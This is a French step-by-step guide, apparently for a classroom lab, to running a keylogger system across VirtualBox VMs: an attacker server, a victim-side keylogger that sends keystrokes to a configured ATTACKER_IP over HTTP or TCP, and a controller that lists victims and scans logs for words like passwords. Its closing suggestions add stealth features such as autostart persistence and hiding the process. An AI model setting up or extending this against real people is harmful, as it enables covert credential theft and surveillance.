# Guide Étape par Étape - Simulation Keylogger

## 📋 Table des Matières
1. [Préparation des Machines Virtuelles](#1-préparation-des-machines-virtuelles)
2. [Configuration du Réseau](#2-configuration-du-réseau)
3. [Installation sur VM Attaquant](#3-installation-sur-vm-attaquant)
4. [Installation sur VM Victime](#4-installation-sur-vm-victime)
5. [Installation du Contrôleur](#5-installation-du-contrôleur)
6. [Exécution du Système](#6-exécution-du-système)
7. [Utilisation du Contrôleur](#7-utilisation-du-contrôleur)
8. [Dépannage](#8-dépannage)

---

## 1. Préparation des Machines Virtuelles

### Étape 1.1 : Créer les VMs dans VirtualBox

1. **VM Attaquant** :
   - Créer une nouvelle VM (Ubuntu/Windows recommandé)
   - Allouer au moins 2 Go de RAM
   - Créer un disque dur virtuel de 20 Go minimum
   - Installer le système d'exploitation

2. **VM Victime** :
   - Créer une nouvelle VM (Ubuntu/Windows recommandé)
   - Allouer au moins 1 Go de RAM
   - Créer un disque dur virtuel de 15 Go minimum
   - Installer le système d'exploitation

### Étape 1.2 : Installer Python

**Sur les deux VMs :**

- **Windows** : Télécharger Python 3.8+ depuis python.org
- **Linux** : 
  ```bash
  sudo apt update
  sudo apt install python3 python3-pip
  ```

---

## 2. Configuration du Réseau

### Étape 2.1 : Configurer le Réseau Interne

1. **VM Attaquant** :
   - VirtualBox → Sélectionner la VM → Paramètres → Réseau
   - Adapter 1 : Activer l'adaptateur réseau
   - Mode d'accès réseau : **Réseau Interne**
   - Nom : `lab-network`
   - Démarrer la VM

2. **VM Victime** :
   - VirtualBox → Sélectionner la VM → Paramètres → Réseau
   - Adapter 1 : Activer l'adaptateur réseau
   - Mode d'accès réseau : **Réseau Interne**
   - Nom : `lab-network`
   - Démarrer la VM

### Étape 2.2 : Trouver les Adresses IP

**Sur VM Attaquant :**
```bash
# Linux
ip addr show
# ou
ifconfig

# Windows
ipconfig
```

Notez l'adresse IP (ex: `192.168.56.101`)

**Sur VM Victime :**
```bash
# Vérifier que la VM peut ping l'attaquant
ping 192.168.56.101
```

---

## 3. Installation sur VM Attaquant

### Étape 3.1 : Transférer les Fichiers

**Option A : Dossier partagé VirtualBox**
1. VirtualBox → Paramètres de la VM → Dossiers partagés
2. Ajouter le dossier `Lab1` comme dossier partagé
3. Monter dans la VM :
   ```bash
   # Linux
   sudo mount -t vboxsf Lab1 /mnt/shared
   ```

**Option B : Clé USB**
- Copier le dossier `attaquant` sur une clé USB
- Transférer dans la VM

**Option C : SCP (si réseau configuré)**
```bash
scp -r attaquant/ user@192.168.56.101:/home/user/
```

### Étape 3.2 : Installer les Dépendances

```bash
cd attaquant
pip3 install -r requirements.txt
```

### Étape 3.3 : Vérifier la Configuration

Ouvrir `config.py` et vérifier :
```python
HTTP_PORT = 8080
TCP_PORT = 9999
STORAGE_DIR = "logs"
```

### Étape 3.4 : Démarrer le Serveur

```bash
python3 server.py
```

Vous devriez voir :
```
==================================================
SERVEUR ATTAQUANT - Keylogger Receiver
==================================================
[+] Port HTTP: 8080
[+] Port TCP: 9999
[+] Dossier de stockage: logs
==================================================
[+] Serveur TCP en écoute sur le port 9999
[+] Démarrage du serveur HTTP...
```

**⚠️ Gardez ce terminal ouvert !**

---

## 4. Installation sur VM Victime

### Étape 4.1 : Transférer les Fichiers

Transférer le dossier `victime` dans la VM (même méthode qu'étape 3.1)

### Étape 4.2 : Installer les Dépendances

```bash
cd victime
pip3 install -r requirements.txt
```

**Note pour Linux** : Vous pourriez avoir besoin de :
```bash
sudo apt install python3-dev
sudo apt install libx11-dev
```

### Étape 4.3 : Configurer l'IP de l'Attaquant

Ouvrir `config.py` et modifier :
```python
ATTACKER_IP = "192.168.56.101"  # L'IP de votre VM Attaquant
ATTACKER_PORT = 8080
EXFILTRATION_MODE = "http"  # ou "tcp"
```

### Étape 4.4 : Tester la Connexion

```bash
# Tester la connexion HTTP
curl http://192.168.56.101:8080/victims

# Ou avec Python
python3 -c "import requests; print(requests.get('http://192.168.56.101:8080/victims').text)"
```

### Étape 4.5 : Démarrer le Keylogger

```bash
python3 keylogger.py
```

Vous devriez voir :
```
[+] Keylogger initialisé
[+] ID Victime: <uuid>
[+] Mode d'exfiltration: http
[+] Serveur cible: 192.168.56.101:8080
[+] Capture démarrée
[+] Keylogger actif. Appuyez sur Ctrl+C pour arrêter.
```

**⚠️ Le keylogger capture maintenant toutes les frappes !**

---

## 5. Installation du Contrôleur

Le contrôleur peut être installé sur :
- La VM Attaquant (même machine)
- Une troisième VM
- Votre machine hôte (si réseau configuré)

### Étape 5.1 : Transférer les Fichiers

Transférer le dossier `controleur`

### Étape 5.2 : Installer les Dépendances

```bash
cd controleur
pip3 install -r requirements.txt
```

### Étape 5.3 : Configurer l'IP de l'Attaquant

Ouvrir `config.py` et modifier :
```python
ATTACKER_IP = "192.168.56.101"  # L'IP de votre VM Attaquant
ATTACKER_PORT = 8080
```

---

## 6. Exécution du Système

### Ordre de Démarrage

1. **Démarrer le serveur attaquant** (VM Attaquant)
   ```bash
   cd attaquant
   python3 server.py
   ```

2. **Démarrer le keylogger** (VM Victime)
   ```bash
   cd victime
   python3 keylogger.py
   ```

3. **Démarrer le contrôleur** (Où vous voulez)
   ```bash
   cd controleur
   python3 controller.py
   ```

### Vérification

Sur la VM Attaquant, vous devriez voir dans le terminal du serveur :
```
[+] 5 logs reçus de <victim_id>
[+] 3 logs reçus de <victim_id>
...
```

---

## 7. Utilisation du Contrôleur

### Commandes Disponibles

```
controleur> list
```
Affiche toutes les victimes actives avec leur statut.

```
controleur> logs <victim_id>
```
Affiche les 50 derniers logs d'une victime.

```
controleur> logs <victim_id> 100
```
Affiche les 100 derniers logs.

```
controleur> analyze <victim_id>
```
Analyse les logs et affiche :
- Nombre total de touches
- Mots-clés détectés
- Séquences répétitives

```
controleur> command <victim_id> start_capture
```
Envoie une commande à la victime (nécessite implémentation côté victime).

```
controleur> help
```
Affiche l'aide.

```
controleur> exit
```
Quitte le contrôleur.

### Exemple de Session

```
controleur> list
Victimes actives:
------------------------------------------------------------
1. ID: 550e8400-e29b-41d4-a716-446655440000
   Statut: ACTIVE
   Dernière activité: 2024-01-15T14:30:25

controleur> logs 550e8400-e29b-41d4-a716-446655440000
Logs pour 550e8400-e29b-41d4-a716-446655440000:
Total: 127 entrées
------------------------------------------------------------
Hello World
This is a test
[ENTER]
password123
------------------------------------------------------------

controleur> analyze 550e8400-e29b-41d4-a716-446655440000
Analyse pour 550e8400-e29b-41d4-a716-446655440000:
------------------------------------------------------------
Total de touches: 127

Mots-clés détectés:
  - Hello
  - World
  - password
  - test

Séquences répétitives:
  - 'a' répété 3 fois
------------------------------------------------------------
```

---

## 8. Dépannage

### Problème : Le keylogger ne peut pas se connecter au serveur

**Solutions :**
1. Vérifier que le serveur attaquant est démarré
2. Vérifier l'IP dans `victime/config.py`
3. Vérifier le firewall :
   ```bash
   # Linux
   sudo ufw allow 8080
   sudo ufw allow 9999
   ```
4. Tester avec ping :
   ```bash
   ping 192.168.56.101
   ```

### Problème : Erreur "Module not found"

**Solution :**
```bash
pip3 install -r requirements.txt
```

### Problème : Permission denied sur Linux (keylogger)

**Solution :**
```bash
# Sur Ubuntu/Debian
sudo apt install python3-dev
sudo apt install libx11-dev

# Ou exécuter avec sudo (non recommandé)
sudo python3 keylogger.py
```

### Problème : Aucune victime n'apparaît dans le contrôleur

**Solutions :**
1. Vérifier que le keylogger est démarré
2. Vérifier que le serveur reçoit des logs (regarder le terminal du serveur)
3. Attendre quelques secondes pour que les logs soient envoyés
4. Vérifier l'IP dans `controleur/config.py`

### Problème : Les logs ne s'affichent pas correctement

**Solution :**
- Vérifier que le dossier `logs/` existe sur le serveur
- Vérifier les permissions d'écriture
- Consulter les logs du serveur pour les erreurs

---

## 📝 Notes Importantes

1. **Sécurité** : Ce projet est uniquement à des fins pédagogiques
2. **Isolation** : Toujours utiliser des machines virtuelles isolées
3. **Réseau** : Utiliser uniquement le réseau interne VirtualBox
4. **Permissions** : Sur Linux, le keylogger peut nécessiter des permissions spéciales
5. **Performance** : Les VMs peuvent être lentes, soyez patient

---

## 🔄 Prochaines Étapes (Améliorations Possibles)

1. **Implémenter les commandes distantes** :
   - Modifier `keylogger.py` pour écouter les commandes
   - Ajouter un endpoint HTTP pour recevoir les commandes

2. **Améliorer l'analyse** :
   - Détection de mots de passe
   - Détection d'URLs
   - Analyse comportementale

3. **Interface Web** :
   - Remplacer le contrôleur CLI par une interface web
   - Utiliser Flask ou Django

4. **Chiffrement** :
   - Chiffrer les logs avant l'envoi
   - Utiliser TLS/SSL pour les communications

5. **Persistance** :
   - Ajouter le keylogger au démarrage automatique
   - Masquer le processus

---

## 📚 Ressources

- Documentation VirtualBox : https://www.virtualbox.org/manual/
- Documentation Python : https://docs.python.org/3/
- Documentation Flask : https://flask.palletsprojects.com/
- Documentation pynput : https://pynput.readthedocs.io/

